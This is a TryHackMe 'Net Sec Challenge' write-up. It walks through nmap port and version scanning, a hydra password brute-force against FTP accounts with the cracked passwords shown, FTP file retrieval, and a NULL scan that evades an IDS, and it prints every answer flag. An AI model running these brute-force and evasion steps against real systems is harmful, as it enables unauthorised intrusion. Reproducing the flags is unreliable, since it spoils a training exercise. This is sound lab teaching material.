# [TryHackMe | Net Sec Challenge](https://tryhackme.com/room/netsecchallenge) Challenge Room Solution Writeup

## [Task 2 | Challenge Questions](https://tryhackme.com/room/netsecchallenge?taskNo=2)

Begin by scanning `TARGET_IP` with `nmap`.

```bash
root@ip-ATTACKER_IP:~# nmap -sV -p- TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00032s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
80/tcp    open  http        THM{MySpecialServer007}
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
8081/tcp  open  http        Node.js (Express middleware)
10001/tcp open  scp-config?
10121/tcp open  ftp         vsftpd 3.0.5
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.94SVN%I=7%D=11/10%Time=6AF36B56%P=x86_64-pc-linux-gnu%r(
SF:NULL,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\x20\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=11/10%Time=6AF36B56%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,1E4,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Accept-Encoding\r\nC
SF:ontent-Type:\x20text/html\r\nAccept-Ranges:\x20bytes\r\nETag:\x20\"5753
SF:57650\"\r\nLast-Modified:\x20Tue,\x2024\x20Feb\x202026\x2006:00:52\x20G
SF:MT\r\nContent-Length:\x20220\r\nConnection:\x20close\r\nDate:\x20Tue,\x
SF:2010\x20Nov\x202026\x2019:07:02\x20GMT\r\nServer:\x20THM{MySpecialServe
SF:r007}\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x2
SF:0<title>Welcome</title>\n\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20
SF:\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,initial-
SF:scale=1\"\x20/>\n</head>\n<body>\n\x20\x20<h1>Hello,\x20world!</h1>\n</
SF:body>\n</html>\n")%r(HTTPOptions,A0,"HTTP/1\.0\x20200\x20OK\r\nAllow:\x
SF:20OPTIONS,\x20GET,\x20HEAD,\x20POST\r\nContent-Length:\x200\r\nConnecti
SF:on:\x20close\r\nDate:\x20Tue,\x2010\x20Nov\x202026\x2019:07:02\x20GMT\r
SF:\nServer:\x20THM{MySpecialServer007}\r\n\r\n")%r(RTSPRequest,1FC,"HTTP/
SF:1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nContent-
SF:Length:\x20345\r\nConnection:\x20close\r\nDate:\x20Tue,\x2010\x20Nov\x2
SF:02026\x2019:07:02\x20GMT\r\nServer:\x20THM{MySpecialServer007}\r\n\r\n<
SF:\?xml\x20version=\"1\.0\"\x20encoding=\"iso-8859-1\"\?>\n<!DOCTYPE\x20h
SF:tml\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transitional//EN\"\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/xhtml1/DTD
SF:/xhtml1-transitional\.dtd\">\n<html\x20xmlns=\"http://www\.w3\.org/1999
SF:/xhtml\"\x20xml:lang=\"en\"\x20lang=\"en\">\n\x20<head>\n\x20\x20<title
SF:>400\x20Bad\x20Request</title>\n\x20</head>\n\x20<body>\n\x20\x20<h1>40
SF:0\x20Bad\x20Request</h1>\n\x20</body>\n</html>\n")%r(FourOhFourRequest,
SF:1F6,"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r\n
SF:Content-Length:\x20341\r\nConnection:\x20close\r\nDate:\x20Tue,\x2010\x
SF:20Nov\x202026\x2019:07:07\x20GMT\r\nServer:\x20THM{MySpecialServer007}\
SF:r\n\r\n<\?xml\x20version=\"1\.0\"\x20encoding=\"iso-8859-1\"\?>\n<!DOCT
SF:YPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transitional
SF://EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/xh
SF:tml1/DTD/xhtml1-transitional\.dtd\">\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\"\x20xml:lang=\"en\"\x20lang=\"en\">\n\x20<head>\n\x20\x
SF:20<title>404\x20Not\x20Found</title>\n\x20</head>\n\x20<body>\n\x20\x20
SF:<h1>404\x20Not\x20Found</h1>\n\x20</body>\n</html>\n");
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 194.06 seconds
```

### What is the highest port number that is open and less than 10,000?

From the `nmap` scan: **8081**.

### There is an open port outside the common 1000 ports; it is above 10,100. What is it?

From the `nmap` scan: **10121**.

### How many TCP ports are open?

From the `nmap` scan: **7**.

### On port 80, what is the service version value?

From the `nmap` scan: **THM{MySpecialServer007}**.

### What is the flag hidden in the SSH server header?

From the `nmap` scan: **THM{946219583339}**.

### We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

From the `nmap` scan: **vsftpd 3.0.5**.

### We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?

Append the two usernames to a file, then run them through `hydra` in an attempt to brute-force their passwords.

```bash
root@ip-ATTACKER_IP:~# printf 'eddie\nquinn\n' > usernames.txt
root@ip-ATTACKER_IP:~# cat usernames.txt 
eddie
quinn
root@ip-ATTACKER_IP:~# hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP:10121 -t 16
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688796 login tries (l:2/p:14344398), ~1793050 tries per task
[DATA] attacking ftp://TARGET_IP:10121/
[10121][ftp] host: TARGET_IP   login: eddie   password: softball
[10121][ftp] host: TARGET_IP   login: quinn   password: cookie
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 
```

Connect to the `FTP` server with each user and search for the hidden flag.

```bash
root@ip-ATTACKER_IP:~# ftp TARGET_IP 10121
Connected to TARGET_IP.
220 (vsFTPd 3.0.5)
Name (TARGET_IP:root): eddie
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30373|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> exit
221 Goodbye.
root@ip-ATTACKER_IP:~# ftp TARGET_IP 10121
Connected to TARGET_IP.
220 (vsFTPd 3.0.5)
Name (TARGET_IP:root): quinn
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30488|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           22 Feb 24  2026 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30429|)
150 Opening BINARY mode data connection for ftp_flag.txt (22 bytes).
100% |*************************************************************|    22      124.90 KiB/s    00:00 ETA
226 Transfer complete.
22 bytes received in 00:00 (27.54 KiB/s)
ftp> exit
221 Goodbye.
root@ip-ATTACKER_IP:~# cat ftp_flag.txt 
THM{QUINN_IS_BACK007}
```

The captured flag is **THM{QUINN_IS_BACK007}**.

### Browsing to http://MACHINE_IP:8081 displays a small challenge that will give you a flag once you solve it. What is the flag?

Inspect `http://TARGET_IP:8081` to understand the challenge.

```html
root@ip-ATTACKER_IP:~# curl -X GET http://TARGET_IP:8081
<html>
    <head>
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/style.css" rel="stylesheet">
    </head>
    <body>
        <div class='firewall-card d-flex justify-content-center align-items-center'>
            <div class='text-center'>
                <div>
                    <div id='packets-all'><span id='packet-count'>0</span> <span id='packets-out-of'>%</span></div>
                    <div id='packets-received'>Chance of scan being detected</div>
                </div>

                <div id='packet-instructions'>
                    Your mission is to use Nmap to scan <b>TARGET_IP</b> (this machine)</br>
                    as covertly as possible and avoid being detected by the IDS.</br>
                </div>
                <div><button onclick='resetPacketCount()' id='reset-packet-count' type="button" class="btn btn-primary d-flex align-items-center justify-content-center"><img src='img/reset.svg'> Reset Packet Count</button></div>
                <div id='packet-msg'></div>
            </div>
        </div>
        <script src="/socket.io/socket.io.js"></script>
        <script src="js/bootstrap.js"></script>
        <script src="js/script.js"></script>
    </body>
</html>
```

Try various `TCP` scan types, including `sS`, `sF`, `sX`, and `sN`. Of these, `sN` is missed by the IDS. 

```bash
root@ip-ATTACKER_IP:~# sudo nmap -sN -p- TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00038s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE         SERVICE
22/tcp    open|filtered ssh
80/tcp    open|filtered http
139/tcp   open|filtered netbios-ssn
445/tcp   open|filtered microsoft-ds
8081/tcp  open|filtered blackice-icecap
10001/tcp open|filtered scp-config
10121/tcp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.91 seconds
```

Once the scan is complete, `http://TARGET_IP:8081` displays the flag **THM{NMAP_CHAMPION001}**.

